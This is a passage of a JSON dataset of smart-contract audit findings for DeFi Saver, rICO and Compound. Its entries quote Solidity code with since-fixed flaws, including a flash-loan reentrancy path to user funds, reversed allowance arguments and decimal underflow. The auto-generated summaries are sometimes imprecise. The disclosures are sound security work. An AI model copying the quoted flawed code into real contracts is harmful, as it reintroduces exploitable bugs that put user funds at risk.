      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13482",
      "title": "Return values not used for DFSExchangeCore.onChainSwap",
      "impact": "LOW",
      "content": "#### Description\n\n\nReturn values from `DFSExchangeCore.onChainSwap` are not used.\n\n\n#### Examples\n\n\n**code/contracts/exchangeV3/DFSExchangeCore.sol:L37-L73**\n\n\n\n```\nfunction \\_sell(ExchangeData memory exData) internal returns (address, uint256) {\n    uint256 amountWithoutFee = exData.srcAmount;\n    address wrapper = exData.offchainData.wrapper;\n    bool offChainSwapSuccess;\n\n    uint256 destBalanceBefore = exData.destAddr.getBalance(address(this));\n\n    // Takes DFS exchange fee\n    exData.srcAmount -= getFee(\n        exData.srcAmount,\n        exData.user,\n        exData.srcAddr,\n        exData.dfsFeeDivider\n    );\n\n    // Try 0x first and then fallback on specific wrapper\n    if (exData.offchainData.price > 0) {\n        (offChainSwapSuccess, ) = offChainSwap(exData, ExchangeActionType.SELL);\n    }\n\n    // fallback to desired wrapper if 0x failed\n    if (!offChainSwapSuccess) {\n        onChainSwap(exData, ExchangeActionType.SELL);\n        wrapper = exData.wrapper;\n    }\n\n    uint256 destBalanceAfter = exData.destAddr.getBalance(address(this));\n    uint256 amountBought = sub(destBalanceAfter, destBalanceBefore);\n\n    // check slippage\n    require(amountBought >= wmul(exData.minPrice, exData.srcAmount), ERR\\_SLIPPAGE\\_HIT);\n\n    // revert back exData changes to keep it consistent\n    exData.srcAmount = amountWithoutFee;\n\n    return (wrapper, amountBought);\n}\n\n```\n**code/contracts/exchangeV3/DFSExchangeCore.sol:L79-L117**\n\n\n\n```\nfunction \\_buy(ExchangeData memory exData) internal returns (address, uint256) {\n    require(exData.destAmount != 0, ERR\\_DEST\\_AMOUNT\\_MISSING);\n\n    uint256 amountWithoutFee = exData.srcAmount;\n    address wrapper = exData.offchainData.wrapper;\n    bool offChainSwapSuccess;\n\n    uint256 destBalanceBefore = exData.destAddr.getBalance(address(this));\n\n    // Takes DFS exchange fee\n    exData.srcAmount -= getFee(\n        exData.srcAmount,\n        exData.user,\n        exData.srcAddr,\n        exData.dfsFeeDivider\n    );\n\n    // Try 0x first and then fallback on specific wrapper\n    if (exData.offchainData.price > 0) {\n        (offChainSwapSuccess, ) = offChainSwap(exData, ExchangeActionType.BUY);\n    }\n\n    // fallback to desired wrapper if 0x failed\n    if (!offChainSwapSuccess) {\n        onChainSwap(exData, ExchangeActionType.BUY);\n        wrapper = exData.wrapper;\n    }\n\n    uint256 destBalanceAfter = exData.destAddr.getBalance(address(this));\n    uint256 amountBought = sub(destBalanceAfter, destBalanceBefore);\n\n    // check slippage\n    require(amountBought >= exData.destAmount, ERR\\_SLIPPAGE\\_HIT);\n\n    // revert back exData changes to keep it consistent\n    exData.srcAmount = amountWithoutFee;\n\n    return (wrapper, amountBought);\n}\n\n```\n#### Recommendation\n\n\nThe return value can be used for verification of the swap or used in the event data.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13481",
      "title": "Unused code present in the codebase",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nSome of the unused code were removed in [DecenterApps/[emailÂ protected]`61b0c09`](https://github.com/DecenterApps/defisaver-v3-contracts/commit/61b0c09181a165cd3aee49df80bbb5f0b519301f).\n\n\n#### Description\n\n\nThere are a few instances of unused code (dead code) in the code base, that is suggested to be removed .\n\n\n#### Examples\n\n\n* `DFSExchange.sol` contract is not used\n* `/contracts/utils/ZrxAllowlist.sol` these functions are not used in the codebase:\n\n\n\t+ `nonPayableAddrs` mapping\n\t+ addNonPayableAddr()\n\t+ removeNonPayableAddr()\n\t+ isNonPayableAddr()\n* `DSProxy.execute(bytes memory _code, bytes memory _data)` is not intended to used.\n\n\nThere might be more instances of unused code in the codebase.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13480",
      "title": "Missing check in IOffchainWrapper.takeOrder implementation",
      "impact": "LOW",
      "content": "#### Description\n\n\n`IOffchainWrapper.takeOrder` wraps an external call that is supposed to perform a token swap. As for the two different implementations `ZeroxWrapper` and `ScpWrapper` this function validates that the destination token balance after the swap is greater than the value before. However, it is not sufficient, and the user-provided minimum amount for swap should be taken in consideration as well. Besides, the external contract should not be trusted upon, and `SafeMath` should be used for the subtraction operation.\n\n\n#### Examples\n\n\n**code/contracts/exchangeV3/offchainWrappersV3/ZeroxWrapper.sol:L42-L50**\n\n\n\n```\nuint256 tokensBefore = \\_exData.destAddr.getBalance(address(this));\n(success, ) = \\_exData.offchainData.exchangeAddr.call{value: \\_exData.offchainData.protocolFee}(\\_exData.offchainData.callData);\nuint256 tokensSwaped = 0;\n\nif (success) {\n    // get the current balance of the swaped tokens\n    tokensSwaped = \\_exData.destAddr.getBalance(address(this)) - tokensBefore;\n    require(tokensSwaped > 0, ERR\\_TOKENS\\_SWAPED\\_ZERO);\n}\n\n```\n**code/contracts/exchangeV3/offchainWrappersV3/ScpWrapper.sol:L43-L51**\n\n\n\n```\nuint256 tokensBefore = \\_exData.destAddr.getBalance(address(this));\n(success, ) = \\_exData.offchainData.exchangeAddr.call{value: \\_exData.offchainData.protocolFee}(\\_exData.offchainData.callData);\nuint256 tokensSwaped = 0;\n\nif (success) {\n    // get the current balance of the swaped tokens\n    tokensSwaped = \\_exData.destAddr.getBalance(address(this)) - tokensBefore;\n    require(tokensSwaped > 0, ERR\\_TOKENS\\_SWAPED\\_ZERO);\n}\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13479",
      "title": "Kyber getRates code is unclear",
      "impact": "LOW",
      "content": "#### Description\n\n\nIn `contracts/exchangeV3/wrappersV3/KyberWrapperV3.sol` the function names donâ€™t reflect their true functionalities, and the code uses some undocumented assumptions.\n\n\n#### Examples\n\n\n* `getSellRate` can be converted into one function to get the rates, which then for buy or sell can swap input and output tokens\n* `getBuyRate` uses a 3% slippage that is not documented.\n\n\n\n```\n   function getSellRate(address \\_srcAddr, address \\_destAddr, uint \\_srcAmount, bytes memory) public override view returns (uint rate) {\n        (rate, ) = KyberNetworkProxyInterface(KYBER\\_INTERFACE)\n            .getExpectedRate(IERC20(\\_srcAddr), IERC20(\\_destAddr), \\_srcAmount);\n\n        // multiply with decimal difference in src token\n        rate = rate \\* (10\\*\\*(18 - getDecimals(\\_srcAddr)));\n        // divide with decimal difference in dest token\n        rate = rate / (10\\*\\*(18 - getDecimals(\\_destAddr)));\n    }\n\n    /// @notice Return a rate for which we can buy an amount of tokens\n    /// @param \\_srcAddr From token\n    /// @param \\_destAddr To token\n    /// @param \\_destAmount To amount\n    /// @return rate Rate\n    function getBuyRate(address \\_srcAddr, address \\_destAddr, uint \\_destAmount, bytes memory \\_additionalData) public override view returns (uint rate) {\n        uint256 srcRate = getSellRate(\\_destAddr, \\_srcAddr, \\_destAmount, \\_additionalData);\n        uint256 srcAmount = wmul(srcRate, \\_destAmount);\n\n        rate = getSellRate(\\_srcAddr, \\_destAddr, srcAmount, \\_additionalData);\n\n        // increase rate by 3% too account for inaccuracy between sell/buy conversion\n        rate = rate + (rate / 30);\n    }\n\n```\n#### Recommendation\n\n\nRefactoring the code to separate getting rate functionality with `getSellRate` and `getBuyRate`. Explicitly document any assumptions in the code ( slippage, etc)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13478",
      "title": "Full test suite is recommended Â Pending",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nThe test suite at this stage is not complete and many of the tests fail to execute. For complicated systems such as DeFi Saver, which uses many different modules and interacts with different DeFi protocols, it is crucial to have a full test coverage that includes the edge cases and failed scenarios. Especially this helps with safer future development and upgrading each modules.\n\n\nAs weâ€™ve seen in some smart contract incidents, a complete test suite can prevent issues that might be hard to find with manual reviews.\n\n\nSome issues such as [issue 5.4](#reversed-order-of-parameters-in-allowance-function-call) could be caught by a full coverage test suite.",
      "summary": "\nThis bug report is about the incomplete test suite of DeFi Saver, a complicated system that interacts with different DeFi protocols. It is important to have a full test coverage that includes edge cases and failed scenarios in order to prevent issues that could be hard to find with manual reviews. An example of such an issue is the reversed order of parameters in an allowance function call, which could be caught by a full coverage test suite. Therefore, it is important to ensure that the test suite is complete in order to ensure the safety of future development and upgrades.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13477",
      "title": "Reversed order of parameters in allowance function call âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed in [DecenterApps/[emailÂ protected]`8b5657b`](https://github.com/DecenterApps/defisaver-v3-contracts/commit/8b5657bd6c6314c29ef6cd7407517f6f5efb440b) by swapping the order of function call parameters.\n\n\n#### Description\n\n\nWhen trying to pull the maximum amount of tokens from an approver to the allowed spender, the parameters that are used for the `allowance` function call are not in the same order that is used later in the call to `safeTransferFrom`.\n\n\n#### Examples\n\n\n**code/contracts/utils/TokenUtils.sol:L26-L44**\n\n\n\n```\nfunction pullTokens(\n    address \\_token,\n    address \\_from,\n    uint256 \\_amount\n) internal returns (uint256) {\n    // handle max uint amount\n    if (\\_amount == type(uint256).max) {\n        uint256 allowance = IERC20(\\_token).allowance(address(this), \\_from);\n        uint256 balance = getBalance(\\_token, \\_from);\n\n        \\_amount = (balance > allowance) ? allowance : balance;\n    }\n\n    if (\\_from != address(0) && \\_from != address(this) && \\_token != ETH\\_ADDR && \\_amount != 0) {\n        IERC20(\\_token).safeTransferFrom(\\_from, address(this), \\_amount);\n    }\n\n    return \\_amount;\n}\n\n```\n#### Recommendation\n\n\nReverse the order of parameters in `allowance` function call to fit the order that is in the `safeTransferFrom` function call.",
      "summary": "\nThis bug report describes an issue with the order of parameters in a function call in the TokenUtils.sol file. When trying to pull the maximum amount of tokens from an approver to the allowed spender, the parameters that are used for the `allowance` function call are not in the same order that is used later in the call to `safeTransferFrom`. This bug was fixed by swapping the order of function call parameters in DecenterApps/[emailÂ protected]`8b5657b`. The recommendation is to reverse the order of parameters in `allowance` function call to fit the order that is in the `safeTransferFrom` function call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13476",
      "title": "Error codes of Compoundâ€™s Comptroller.enterMarket, Comptroller.exitMarket are not checked âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed in [DecenterApps/[emailÂ protected]`7075e49`](https://github.com/DecenterApps/defisaver-v3-contracts/commit/7075e490bde07ad82fe8b904eea1c076c7efe391) by reverting in the case the return value is non zero.\n\n\n#### Description\n\n\nCompoundâ€™s `enterMarket/exitMarket` functions return an error code instead of reverting in case of failure.\nDeFi Saver smart contracts never check for the error codes returned from Compound smart contracts, although the code flow might revert due to unavailability of the CTokens, however early on checks for Compound errors are suggested.\n\n\n#### Examples\n\n\n**code/contracts/actions/compound/helpers/CompHelper.sol:L26-L37**\n\n\n\n```\nfunction enterMarket(address \\_cTokenAddr) public {\n    address[] memory markets = new address[](1);\n    markets[0] = \\_cTokenAddr;\n\n    IComptroller(COMPTROLLER\\_ADDR).enterMarkets(markets);\n}\n\n/// @notice Exits the Compound market\n/// @param \\_cTokenAddr CToken address of the token\nfunction exitMarket(address \\_cTokenAddr) public {\n    IComptroller(COMPTROLLER\\_ADDR).exitMarket(\\_cTokenAddr);\n}\n\n```\n#### Recommendation\n\n\nCaller contract should revert in case the error code is not 0.",
      "summary": "\nThis bug report is about an issue with Compound's enterMarket/exitMarket functions, which return an error code instead of reverting in case of failure. The DeFi Saver smart contracts do not check for the error codes returned from Compound smart contracts, which could lead to unexpected results. The code flow might revert due to unavailability of the CTokens, but early on checks for Compound errors are suggested. The caller contract should revert in case the error code is not 0. The bug has now been fixed in DecenterApps/[emailÂ protected]`7075e49` by reverting in the case the return value is non zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13475",
      "title": "Tokens with more than 18 decimal points will cause issues âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed in [DecenterApps/[emailÂ protected]`de22007`](https://github.com/DecenterApps/defisaver-v3-contracts/commit/de220072cf0fd507f8b600ee60fb972fea7ce567) by using `SafeMath.sub` to revert on tokens with Decimal > 18\n\n\n#### Description\n\n\nIt is assumed that the maximum number of decimals for each token is 18. However uncommon, but it is possible to have tokens with more than 18 decimals, as an Example [YAMv2](https://etherscan.io/token/0xaba8cac6866b83ae4eec97dd07ed254282f6ad8a) has 24 decimals. This can result in broken code flow and unpredictable outcomes (e.g. an underflow will result with really high rates).\n\n\n#### Examples\n\n\n* `contracts/exchangeV3/wrappersV3/KyberWrapperV3.sol`\n\n\n\n```\n    function getSellRate(address \\_srcAddr, address \\_destAddr, uint \\_srcAmount, bytes memory) public override view returns (uint rate) {\n        (rate, ) = KyberNetworkProxyInterface(KYBER\\_INTERFACE)\n            .getExpectedRate(IERC20(\\_srcAddr), IERC20(\\_destAddr), \\_srcAmount);\n\n        // multiply with decimal difference in src token\n        rate = rate \\* (10\\*\\*(18 - getDecimals(\\_srcAddr)));\n        // divide with decimal difference in dest token\n        rate = rate / (10\\*\\*(18 - getDecimals(\\_destAddr)));\n    }\n\n```\n* `code/contracts/views/AaveView.sol` : also used in `getLoanData()`\n\n\n#### Recommendation\n\n\nMake sure the code wonâ€™t fail in case the tokenâ€™s decimals is more than 18.",
      "summary": "\nA bug was discovered in DecenterApps/defisaver-v3-contracts that affects the code flow and can lead to unpredictable outcomes when dealing with tokens with a decimal value greater than 18. This bug was fixed by using the SafeMath.sub function to revert on tokens with Decimal > 18. Examples of the code affected include KyberWrapperV3.sol and AaveView.sol. It is important to ensure that the code will not fail in cases where the token's decimal value is greater than 18.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13474",
      "title": "Random task execution âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed in [DecenterApps/[emailÂ protected]`478e9cd`](https://github.com/DecenterApps/defisaver-v3-contracts/commit/478e9cdc586ab669cf9ef69222f8886b4771d163) by adding `ReentrancyGuard` to the `executeOperation` function.\n\n\n#### Description\n\n\nIn a scenario where user takes a flash loan, `_parseFLAndExecute()` gives the flash loan wrapper contract (`FLAaveV2`, `FLDyDx`) the permission to execute functions on behalf of the userâ€™s `DSProxy`. This execution permission is revoked only after the entire recipe execution is finished, which means that in case that any of the external calls along the recipe execution is malicious, it might call `executeAction()` back and inject any task it wishes (e.g. take userâ€™s funds out, drain approved tokens, etc)\n\n\n#### Examples\n\n\n**code/contracts/actions/flashloan/FLAaveV2.sol:L105-L136**\n\n\n\n```\nfunction executeOperation(\n    address[] memory \\_assets,\n    uint256[] memory \\_amounts,\n    uint256[] memory \\_fees,\n    address \\_initiator,\n    bytes memory \\_params\n) public returns (bool) {\n    require(msg.sender == AAVE\\_LENDING\\_POOL, ERR\\_ONLY\\_AAVE\\_CALLER);\n    require(\\_initiator == address(this), ERR\\_SAME\\_CALLER);\n\n    (Task memory currTask, address proxy) = abi.decode(\\_params, (Task, address));\n\n    // Send FL amounts to user proxy\n    for (uint256 i = 0; i < \\_assets.length; ++i) {\n        \\_assets[i].withdrawTokens(proxy, \\_amounts[i]);\n    }\n\n    address payable taskExecutor = payable(registry.getAddr(TASK\\_EXECUTOR\\_ID));\n\n    // call Action execution\n    IDSProxy(proxy).execute{value: address(this).balance}(\n        taskExecutor,\n        abi.encodeWithSelector(CALLBACK\\_SELECTOR, currTask, bytes32(\\_amounts[0] + \\_fees[0]))\n    );\n\n    // return FL\n    for (uint256 i = 0; i < \\_assets.length; i++) {\n        \\_assets[i].approveToken(address(AAVE\\_LENDING\\_POOL), \\_amounts[i] + \\_fees[i]);\n    }\n\n    return true;\n}\n\n```\n#### Recommendation\n\n\nA reentrancy guard (mutex) that covers the entire content of `FLAaveV2.executeOperation`/`FLDyDx.callFunction` should be used to prevent such attack.",
      "summary": "\nThis bug report is about a scenario where a user takes a flash loan. In this scenario, the flash loan wrapper contract (FLAaveV2 or FLDyDx) is given permission to execute functions on behalf of the userâ€™s DSProxy. However, this permission is not revoked until the entire recipe execution is finished. This means that if any of the external calls along the recipe execution is malicious, it could call `executeAction()` back and inject any task it wishes, such as taking userâ€™s funds or draining approved tokens.\n\nThe bug was fixed by adding `ReentrancyGuard` to the `executeOperation` function in DecenterApps/[emailÂ protected]`478e9cd`. It is recommended that a reentrancy guard (mutex) should be used to cover the entire content of `FLAaveV2.executeOperation`/`FLDyDx.callFunction` in order to prevent such an attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13747",
      "title": "emit events for significant state changes âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis issue was discussed in the code walk through meeting and was fixed, by adding proper events to the code base in [lukso-network/[emailÂ protected]`77517a4`](https://github.com/lukso-network/rICO-smart-contracts/commit/77517a4dceed53ff7c5a7f7580cb805831a7f8d5,) before the end of the audit.\n\n\n#### Description\n\n\nEvents are useful for UI changes and user notifications. The code base overall can use more use of events to update the UI and participants.\n\n\nOne of the most important aspects that must emit events, are when system state and functionality are changed. These functions require to emit events for better visibility to the participants:\n\n\n* `freeze()`\n* `unfreeze()`\n* `disableEscapeHatch()`\n* `escapeHatch()`\n\n\n#### Recommendation\n\n\nemit events when system state is changed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "rICO",
      "source_link": "https://consensys.net/diligence/audits/2020/04/rico/",
      "github_link": "",
      "tags": [],
      "finders": [
        "GonÃ§alo SÃ¡",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13746",
      "title": "Lockup condition in getStageAtBlock() âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nEven though the freeze pattern does indeed create a lot of additional complexity to the protocol, the particular `require` mentioned in the issue corpus by the audit team was found to never be triggered in a harmful way by rICOâ€™s development team.\n\n\nIn the light of this new discovery, we are greatly reducing the severity of the issue to â€œMinorâ€. The reason why it is still kept as an issue is that the implementation of the freezing mechanism could still be greatly improved as we saw in the presented fixes here:\n\n\n[lukso-network/[emailÂ protected]`e4c9ed5`](https://github.com/lukso-network/rICO-smart-contracts/commit/e4c9ed54dbe71233867fc0c53a1c3e711550d8bb)\n\n\nThe changes resulted in a much more resilient rICO implementation.\n\n\n\n\n#### Description\n\n\nGiven that the contract has been frozen at least once, if the `frozenPeriod` is longer than the period before the freeze event (starting from `commitPhaseStartBlock` till the `freezeStart`), the following require in `getStageAtBlock()` will revert due to the fact that `blockNumber < commitPhaseStartBlock`:\n\n\n\n```\nuint256 blockNumber = \\_blockNumber.sub(frozenPeriod); // adjust the block by the frozen period\n\nrequire(blockNumber >= commitPhaseStartBlock && blockNumber <= buyPhaseEndBlock, \"Block outside of rICO period.\");\n\n```\nNote that the issue here is also related to the way currentBlockNumber is calculated (See [issue 6.3](#frozenperiod-is-subtracted-twice-for-calculating-the-current-price) and [Separate currentBlock from currentEffectiveBlock](#separate-currentblock-from-currenteffectiveblock).\n\n\n`getCurrentStage()` is called for every accept or cancelation of contributions and this lockup can result in total system halt.\n\n\n#### Recommendation\n\n\nGiven that in the `init` function, the following condition is checked:\n\n\n\n```\nrequire(\\_commitPhaseStartBlock > getCurrentBlockNumber(), \"Start block cannot be set in the past.\");\n\n```\nThe check in the `getStageAtBlock()` can be removed. However this is assuming that the correct calculation of the `currentEffectiveBlockNumber` is used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "rICO",
      "source_link": "https://consensys.net/diligence/audits/2020/04/rico/",
      "github_link": "",
      "tags": [],
      "finders": [
        "GonÃ§alo SÃ¡",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13745",
      "title": "frozenPeriod is subtracted twice for calculating the current price âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFound in parallel to the audit team and has been mitigated in [lukso-network/[emailÂ protected]`ebc4bce`](https://github.com/lukso-network/rICO-smart-contracts/commit/ebc4bcee5fd52cec9f72e115725dfffa791e58f7) . The issue was further simplified by adding `getCurrentEffectiveBlockNumber()` in [lukso-network/[emailÂ protected]`e4c9ed5`](https://github.com/lukso-network/rICO-smart-contracts/commit/e4c9ed54dbe71233867fc0c53a1c3e711550d8bb) to remove ambiguity when calculating current block number.\n\n\n#### Description\n\n\nIf the contract had been frozen, the current stage price will calculate the price by subtracting the `frozenPeriod` twice and result in wrong calculation.\n\n\n`getCurrentBlockNumber()` subtracts `frozenPeriod` once, and then `getStageAtBlock()` will also subtract the same number again.\n\n\n#### Examples\n\n\n**code/contracts/ReversibleICO.sol:L617-L619**\n\n\n\n```\nfunction getCurrentStage() public view returns (uint8) {\n    return getStageAtBlock(getCurrentBlockNumber());\n}\n\n```\n**code/contracts/ReversibleICO.sol:L711-L714**\n\n\n\n```\nfunction getCurrentBlockNumber() public view returns (uint256) {\n    return uint256(block.number)\n    .sub(frozenPeriod); // make sure we deduct any frozenPeriod from calculations\n}\n\n```\n**code/contracts/ReversibleICO.sol:L654-L656**\n\n\n\n```\nfunction getStageAtBlock(uint256 \\_blockNumber) public view returns (uint8) {\n\n    uint256 blockNumber = \\_blockNumber.sub(frozenPeriod); // adjust the block by the frozen period\n\n```\n#### Recommendation\n\n\nMake sure `frozenPeriod` calculation is done correctly. It could be solved by renaming `getCurrentBlockNumber()` to reflect the calculation done inside the function.\n\n\ne.g. :\n\n\n* `getCurrentBlockNumber()` : gets current block number\n* `getCurrentEffectiveBlockNumber()` : calculates the effective block number deducting `frozenPeriod`",
      "summary": "\nA bug was found in the Lukso Network's rICO smart contract that caused incorrect calculation of the current stage price if the contract had been frozen. The issue was due to the `getCurrentBlockNumber()` subtracting `frozenPeriod` once and then `getStageAtBlock()` subtracting the same number again. This was resolved by adding `getCurrentEffectiveBlockNumber()` to remove ambiguity when calculating the current block number. The recommendation is to make sure the `frozenPeriod` calculation is done correctly and to rename `getCurrentBlockNumber()` to `getCurrentEffectiveBlockNumber()` to reflect the calculation done inside the function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "rICO",
      "source_link": "https://consensys.net/diligence/audits/2020/04/rico/",
      "github_link": "",
      "tags": [],
      "finders": [
        "GonÃ§alo SÃ¡",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13744",
      "title": "FreezerAddress has more power than required Â Acknowledged",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis issue is acknowledged by the client and the behaviour has been documented in [security measurements](https://github.com/lukso-network/rICO-smart-contracts/tree/develop#security-measurements).\n\n\n#### Description\n\n\n*FreezerAddress* is designed to have the ability of freezing the contract in case of emergency. However, indirectly, there are other changes in the system that can result from the freeze.\n\n\n#### Examples\n\n\n1. FreezerAddress can extend the rICO time frame. Given that the `frozenPeriod` is deducted from the blockNumber in stage calculations, the `buyPhaseEndBlock` is technically equals to `buyPhaseEndBlock + frozenPeriod`\n2. FreezerAddress can call `disableEscapeHatch()`, which disables the escape hatch and rendering `RescuerAddress` useless.\n\n\n#### Recommendation\n\n\nIf these behaviors are intentional they should be well documented and specified. If not, they should be removed.\n\n\nIn the case they are, indeed, intentional the audit team believes that, for *Example 1.*, there should be some event fired to serve as notification for the participants (possibly followed by off-chain infrastructure to warn them through email or other communication channel).",
      "summary": "\nThis bug report is about the *FreezerAddress* feature of the rICO smart contracts, which is designed to freeze the contract in case of emergency. However, there are other changes in the system that can result from the freeze, such as extending the rICO time frame or disabling the escape hatch. The audit team believes that if these behaviors are intentional they should be well documented and specified, and if not, they should be removed. If the behaviors are intentional, there should be some event fired to serve as notification for the participants, possibly followed by off-chain infrastructure to warn them through email or other communication channel. The issue has been acknowledged by the client and the behaviour has been documented in security measurements.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "rICO",
      "source_link": "https://consensys.net/diligence/audits/2020/04/rico/",
      "github_link": "",
      "tags": [],
      "finders": [
        "GonÃ§alo SÃ¡",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13743",
      "title": "Test code present in the code base âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed in [lukso-network/[emailÂ protected]`edb880c`](https://github.com/lukso-network/rICO-smart-contracts/commit/edb880c56e5c84fe02727f1203778a7a28323f6d).\n\n\n#### Description\n\n\nTest code are present in the code base. This is mainly a reminder to fix those before production.\n\n\n#### Examples\n\n\n`rescuerAddress` and `freezerAddress` are not even in the function arguments.\n\n\n**code/contracts/ReversibleICO.sol:L243-L247**\n\n\n\n```\nwhitelistingAddress = \\_whitelistingAddress;\nprojectAddress = \\_projectAddress;\nfreezerAddress = \\_projectAddress; // TODO change, here only for testing\nrescuerAddress = \\_projectAddress; // TODO change, here only for testing\n\n\n```\n#### Recommendation\n\n\nMake sure all the variable assignments are ready for production before deployment to production.",
      "summary": "\nThis bug report is about a coding issue in the ReversibleICO.sol file. In the code, the variables `rescuerAddress` and `freezerAddress` are not included in the function arguments. Instead, they are being assigned to `_projectAddress`, which is only meant for testing. This issue needs to be fixed before production to ensure that the code is ready for deployment. The bug has been fixed in the commit [lukso-network/[emailÂ protected]`edb880c`](https://github.com/lukso-network/rICO-smart-contracts/commit/edb880c56e5c84fe02727f1203778a7a28323f6d). Therefore, it is recommended to make sure that all the variable assignments are ready for production before deployment.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "rICO",
      "source_link": "https://consensys.net/diligence/audits/2020/04/rico/",
      "github_link": "",
      "tags": [],
      "finders": [
        "GonÃ§alo SÃ¡",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "11579",
      "title": "[M03] Unnecessary calls to drip function of pot contract",
      "impact": "MEDIUM",
      "content": "When `rho == now`, [`pot.drip`](https://github.com/makerdao/dss/blob/effdda3657f71fd6efc3465dc661b375d1bacc3e/src/pot.sol#L137) is a gas-intensive no-op. This means every call to the [`CDaiDelegate` `accrueInterest` function](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/CDaiDelegate.sol#L101) (within a given Ethereum block and after `pot.drip` has been called) calls [`pot.drip`](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/CDaiDelegate.sol#L103) unnecessarily. Consider wrapping [line 103 of `CDaiDelegate.sol`](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/CDaiDelegate.sol#L103) in an `if (PotLike(potAddress).rho() != now) { ... }` statement. This could provide gas savings (on average) when cDai and/or the DSR is getting a lot of use. See [this GitHub issue](https://github.com/makerdao/dss/issues/87) for more information.",
      "summary": "\nThis bug report relates to the MakerDAO and Compound Protocols. The issue is that when the `rho` variable is equal to `now`, the `pot.drip` function becomes a no-op, meaning it is gas-intensive but does nothing. This means that the `accrueInterest` function within the `CDaiDelegate` is calling `pot.drip` unnecessarily every time it is called within an Ethereum block. To fix this issue, it is suggested that the `if (PotLike(potAddress).rho() != now) { ... }` statement is wrapped around line 103 of the `CDaiDelegate.sol` to provide gas savings when the cDai and/or the DSR is being used a lot.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
